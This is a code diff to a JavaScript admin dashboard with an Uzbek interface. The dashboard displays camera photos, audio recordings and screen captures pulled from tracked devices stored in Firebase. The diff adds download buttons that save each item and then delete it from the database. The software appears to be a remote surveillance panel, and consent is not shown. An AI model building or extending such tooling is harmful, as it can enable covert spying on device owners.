@@ -78,11 +78,14 @@ function attachAdminDeviceListeners(devId) {
     snap.forEach(child => {
       const v = child.val();
       if (v && (v.back_base64 || v.front_base64)) {
+        v._key = child.key;
         list.push(v);
       }
     });
     adminDeviceData.photos = list;
-    if (list.length > 0) adminDeviceData.currentPhotoIdx = list.length - 1;
+    if (adminDeviceData.currentPhotoIdx >= list.length) {
+      adminDeviceData.currentPhotoIdx = Math.max(0, list.length - 1);
+    }
     renderAdminPhotos();
   };
   devRef.child('media/archive_photos').limitToLast(20).on('value', photosCb);
@@ -94,11 +97,14 @@ function attachAdminDeviceListeners(devId) {
     snap.forEach(child => {
       const v = child.val();
       if (v && v.audio_base64) {
+        v._key = child.key;
         list.push(v);
       }
     });
     adminDeviceData.audios = list;
-    if (list.length > 0) adminDeviceData.currentAudioIdx = list.length - 1;
+    if (adminDeviceData.currentAudioIdx >= list.length) {
+      adminDeviceData.currentAudioIdx = Math.max(0, list.length - 1);
+    }
     renderAdminAudio();
   };
   devRef.child('media/archive_audio').limitToLast(20).on('value', audioCb);
@@ -110,11 +116,14 @@ function attachAdminDeviceListeners(devId) {
     snap.forEach(child => {
       const v = child.val();
       if (v && (v.screen_base64 || v.video_base64)) {
+        v._key = child.key;
         list.push(v);
       }
     });
     adminDeviceData.screens = list;
-    if (list.length > 0) adminDeviceData.currentScreenIdx = list.length - 1;
+    if (adminDeviceData.currentScreenIdx >= list.length) {
+      adminDeviceData.currentScreenIdx = Math.max(0, list.length - 1);
+    }
     renderAdminScreenCapture();
   };
   devRef.child('media/archive_screen').limitToLast(20).on('value', screenCb);
@@ -479,9 +488,12 @@ function renderAdminPhotos() {
         </div>
       </div>
     </div>
-    <div style="display: flex; justify-content: space-between; margin-top: 10px;">
-      <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px;" onclick="adminPrevPhoto()" ${idx === 0 ? 'disabled' : ''}>◀ Oldingi</button>
-      <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px;" onclick="adminNextPhoto()" ${idx === photos.length - 1 ? 'disabled' : ''}>Keyingi ▶</button>
+    <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 10px;">
+      <div style="display: flex; gap: 6px;">
+        <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px;" onclick="adminPrevPhoto()" ${idx === 0 ? 'disabled' : ''}>◀ Oldingi</button>
+        <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px;" onclick="adminNextPhoto()" ${idx === photos.length - 1 ? 'disabled' : ''}>Keyingi ▶</button>
+      </div>
+      <button class="btn btn-primary" style="padding: 4px 12px; font-size: 12px; background: #16A34A; border-color: #16A34A; color: white;" onclick="adminDownloadPhoto(${idx})">💾 Saqlash</button>
     </div>
   `;
 }
@@ -527,9 +539,12 @@ function renderAdminAudio() {
   container.innerHTML = `
     <div style="font-size: 11px; color: var(--text-secondary); margin-bottom: 6px;">Vaqt: ${timeStr}</div>
     <audio controls src="data:audio/mp4;base64,${cur.audio_base64}" style="width: 100%; height: 38px; margin-bottom: 8px;"></audio>
-    <div style="display: flex; justify-content: space-between;">
-      <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px;" onclick="adminPrevAudio()" ${idx === 0 ? 'disabled' : ''}>◀ Oldingi</button>
-      <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px;" onclick="adminNextAudio()" ${idx === audios.length - 1 ? 'disabled' : ''}>Keyingi ▶</button>
+    <div style="display: flex; justify-content: space-between; align-items: center;">
+      <div style="display: flex; gap: 6px;">
+        <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px;" onclick="adminPrevAudio()" ${idx === 0 ? 'disabled' : ''}>◀ Oldingi</button>
+        <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px;" onclick="adminNextAudio()" ${idx === audios.length - 1 ? 'disabled' : ''}>Keyingi ▶</button>
+      </div>
+      <button class="btn btn-primary" style="padding: 4px 12px; font-size: 12px; background: #0D9488; border-color: #0D9488; color: white;" onclick="adminDownloadAudio(${idx})">💾 Yuklab Olish</button>
     </div>
   `;
 }
@@ -581,9 +596,12 @@ function renderAdminScreenCapture() {
         <img src="data:image/jpeg;base64,${cur.screen_base64}" style="max-height: 240px; width: 100%; object-fit: contain;">
       ` : `<span style="color: #64748B; font-size: 11px;">Tasvir yo'q</span>`)}
     </div>
-    <div style="display: flex; justify-content: space-between;">
-      <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px;" onclick="adminPrevScreen()" ${idx === 0 ? 'disabled' : ''}>◀ Oldingi</button>
-      <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px;" onclick="adminNextScreen()" ${idx === screens.length - 1 ? 'disabled' : ''}>Keyingi ▶</button>
+    <div style="display: flex; justify-content: space-between; align-items: center;">
+      <div style="display: flex; gap: 6px;">
+        <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px;" onclick="adminPrevScreen()" ${idx === 0 ? 'disabled' : ''}>◀ Oldingi</button>
+        <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px;" onclick="adminNextScreen()" ${idx === screens.length - 1 ? 'disabled' : ''}>Keyingi ▶</button>
+      </div>
+      <button class="btn btn-primary" style="padding: 4px 12px; font-size: 12px; background: #7C3AED; border-color: #7C3AED; color: white;" onclick="adminDownloadScreen(${idx})">💾 Yuklab Olish</button>
     </div>
   `;
 }
@@ -601,6 +619,97 @@ function adminNextScreen() {
     renderAdminScreenCapture();
   }
 }
+
+function downloadBase64File(base64Data, fileName, mimeType) {
+  try {
+    const link = document.createElement('a');
+    link.href = `data:${mimeType};base64,${base64Data}`;
+    link.download = fileName;
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+    return true;
+  } catch (e) {
+    console.error('Download error:', e);
+    return false;
+  }
+}
+
+function adminDownloadPhoto(idx) {
+  const cur = adminDeviceData.photos[idx];
+  if (!cur) return;
+  const ts = cur.timestamp || Date.now();
+  let downloaded = false;
+  if (cur.back_base64) {
+    downloadBase64File(cur.back_base64, `Photo_Back_${ts}.jpg`, 'image/jpeg');
+    downloaded = true;
+  }
+  if (cur.front_base64) {
+    downloadBase64File(cur.front_base64, `Photo_Front_${ts}.jpg`, 'image/jpeg');
+    downloaded = true;
+  }
+  if (downloaded && cur._key && adminSelectedUsername) {
+    window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/media/archive_photos/${cur._key}`).remove()
+      .then(() => {
+        showToast("💾 Rasm saqlandi va bazadan o'chirildi!");
+      })
+      .catch(err => {
+        console.error(err);
+        showToast("💾 Rasm saqlandi, lekin bazadan o'chirishda xatolik bo'ldi.");
+      });
+  }
+}
+
+function adminDownloadAudio(idx) {
+  const cur = adminDeviceData.audios[idx];
+  if (!cur || !cur.audio_base64) return;
+  const ts = cur.timestamp || Date.now();
+  downloadBase64File(cur.audio_base64, `Audio_${ts}.m4a`, 'audio/mp4');
+  if (cur._key && adminSelectedUsername) {
+    window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/media/archive_audio/${cur._key}`).remove()
+      .then(() => {
+        showToast("💾 Ovoz yozuvi yuklandi va bazadan o'chirildi!");
+      })
+      .catch(err => {
+        console.error(err);
+        showToast("💾 Ovoz yuklandi, lekin bazadan o'chirishda xatolik bo'ldi.");
+      });
+  }
+}
+
+function adminDownloadScreen(idx) {
+  const cur = adminDeviceData.screens[idx];
+  if (!cur) return;
+  const ts = cur.timestamp || Date.now();
+  let downloaded = false;
+  if (cur.video_base64) {
+    downloadBase64File(cur.video_base64, `Screen_Video_${ts}.mp4`, 'video/mp4');
+    downloaded = true;
+  } else if (cur.screen_base64) {
+    downloadBase64File(cur.screen_base64, `Screen_Capture_${ts}.jpg`, 'image/jpeg');
+    downloaded = true;
+  }
+  if (downloaded && cur._key && adminSelectedUsername) {
+    window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/media/archive_screen/${cur._key}`).remove()
+      .then(() => {
+        showToast("💾 Ekran yozuvi yuklandi va bazadan o'chirildi!");
+      })
+      .catch(err => {
+        console.error(err);
+        showToast("💾 Ekran yozuvi yuklandi, lekin bazadan o'chirishda xatolik bo'ldi.");
+      });
+  }
+}
+
+window.adminPrevPhoto = adminPrevPhoto;
+window.adminNextPhoto = adminNextPhoto;
+window.adminPrevAudio = adminPrevAudio;
+window.adminNextAudio = adminNextAudio;
+window.adminPrevScreen = adminPrevScreen;
+window.adminNextScreen = adminNextScreen;
+window.adminDownloadPhoto = adminDownloadPhoto;
+window.adminDownloadAudio = adminDownloadAudio;
+window.adminDownloadScreen = adminDownloadScreen;
 
 // React to global store user changes
 window.onStoreChange('users', () => {
